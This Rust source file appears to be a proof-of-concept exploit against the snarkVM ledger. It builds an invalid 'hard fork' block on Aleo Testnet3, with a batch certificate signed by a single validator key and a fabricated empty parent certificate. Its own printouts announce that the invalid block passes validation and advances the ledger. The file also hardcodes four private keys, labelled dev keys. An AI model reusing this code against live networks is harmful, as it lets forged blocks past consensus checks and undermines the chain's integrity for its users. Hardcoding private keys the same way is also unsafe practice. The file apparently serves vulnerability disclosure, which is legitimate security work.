use std::{fs, str::FromStr};

use indexmap::{IndexMap, IndexSet};
use snarkvm::{
    console::{
        account::PrivateKey,
        network::Testnet3,
        program::Network,
    },
    ledger::{
        narwhal::{BatchCertificate, BatchHeader, Subdag, Transmission},
        store::{helpers::memory::ConsensusMemory, ConsensusStorage},
        transaction::Transaction,
        Ledger,
    },
    prelude::block::Block,
};

/// Dev private keys:
/// pk: APrivateKey1zkp8CZNn3yeCseEtxuVPbDCwSyhGW6yZKUYKfgXmcpoGPWH, address:aleo1rhgdu77hgyqd3xjj8ucu3jj9r2krwz6mnzyd80gncr5fxcwlh5rsvzp9px
/// pk: APrivateKey1zkp2RWGDcde3efb89rjhME1VYA8QMxcxep5DShNBR6n8Yjh, address:aleo1s3ws5tra87fjycnjrwsjcrnw2qxr8jfqqdugnf0xzqqw29q9m5pqem2u4t
/// pk: APrivateKey1zkp2GUmKbVsuc1NSj28pa1WTQuZaK5f1DQJAT6vPcHyWokG, address:aleo1ashyu96tjwe63u0gtnnv8z5lhapdu4l5pjsl2kha7fv7hvz2eqxs5dz0rg
/// pk: APrivateKey1zkpBjpEgLo4arVUkQmcLdKQMiAKGaHAQVVwmF8HQby8vdYs, address:aleo12ux3gdauck0v60westgcpqj7v8rrcr3v346e4jtq04q7kkt22czsh808v2

fn main() {
    // Open file ./genesis.block
    let data = fs::read_to_string("./genesis.block").expect("Unable to read file");
    let genesis = Block::from_str(&data).unwrap();
    // dev_private_keys();
    run::<Testnet3, ConsensusMemory<Testnet3>>(&genesis);
}

fn run<N: Network, C: ConsensusStorage<N>>(genesis: &Block<N>) {
    let canon = Ledger::<N, C>::load(genesis.clone(), Some(5)).unwrap();
    // let committee = canon.latest_committee().unwrap();
    // let leader_for_round1 = committee.get_leader(1).unwrap();
    // println!("{}", leader_for_round1);
    let block = create_hard_fork_block(&canon);
    println!("Create an invalid block");
    canon
        .check_next_block(&block, &mut rand::thread_rng())
        .unwrap();
    println!("Check pass");
    canon.advance_to_next_block(&block).unwrap();
    println!("Advance success")
}

fn create_hard_fork_block<N: Network, C: ConsensusStorage<N>>(ledger: &Ledger<N, C>) -> Block<N> {
    use std::collections::BTreeMap;
    // Leader for round4:
    // Address: aleo1ashyu96tjwe63u0gtnnv8z5lhapdu4l5pjsl2kha7fv7hvz2eqxs5dz0rg
    // PrivateKey: APrivateKey1zkp2GUmKbVsuc1NSj28pa1WTQuZaK5f1DQJAT6vPcHyWokG

    let private_key =
        PrivateKey::<N>::from_str("APrivateKey1zkp2GUmKbVsuc1NSj28pa1WTQuZaK5f1DQJAT6vPcHyWokG")
            .unwrap();
    let transaction = fs::read_to_string("./transaction").expect("Unable to read file");
    let transaction = Transaction::<N>::from_str(&transaction).unwrap();
    let transmission_id = snarkvm::ledger::narwhal::TransmissionID::Transaction(transaction.id());
    let transmission = Transmission::from(transaction);

    let now = time::OffsetDateTime::now_utc().unix_timestamp();
    let mut previous_certificate_ids = IndexSet::new();
    let mut transmissions = IndexSet::new();
    transmissions.insert(transmission_id);
    let previous_certificate = create_empty_certificate();
    previous_certificate_ids.insert(previous_certificate.id());
    let batch_header = BatchHeader::new(
        &private_key,
        4,
        now,
        transmissions,
        previous_certificate_ids,
        &mut rand::thread_rng(),
    )
    .unwrap();
    let mut signatures = IndexSet::new();
    let signature = private_key
        .sign(&[batch_header.batch_id()], &mut rand::thread_rng())
        .unwrap();
    signatures.insert(signature);
    let batch_certificate = BatchCertificate::from(batch_header, signatures).unwrap();
    let mut certificate_set = IndexSet::new();
    certificate_set.insert(batch_certificate);
    let mut subdag = BTreeMap::new();
    subdag.insert(4, certificate_set);
    let subdag = Subdag::from(subdag).unwrap();
    let mut transmissions = IndexMap::new();
    transmissions.insert(transmission_id, transmission);

    let block = ledger
        .prepare_advance_to_next_quorum_block(subdag, transmissions)
        .unwrap();
    block
}

fn create_empty_certificate<N: Network>() -> BatchCertificate<N> {
    let private_key =
        PrivateKey::<N>::from_str("APrivateKey1zkpBjpEgLo4arVUkQmcLdKQMiAKGaHAQVVwmF8HQby8vdYs")
            .unwrap();
    let now = time::OffsetDateTime::now_utc().unix_timestamp();
    let batch_header = BatchHeader::new(
        &private_key,
        1,
        now,
        IndexSet::new(),
        IndexSet::new(),
        &mut rand::thread_rng(),
    )
    .unwrap();
    let mut signatures = IndexSet::new();
    let signature = private_key
        .sign(&[batch_header.batch_id()], &mut rand::thread_rng())
        .unwrap();
    signatures.insert(signature);
    let batch_certificate = BatchCertificate::from(batch_header, signatures).unwrap();
    batch_certificate
}
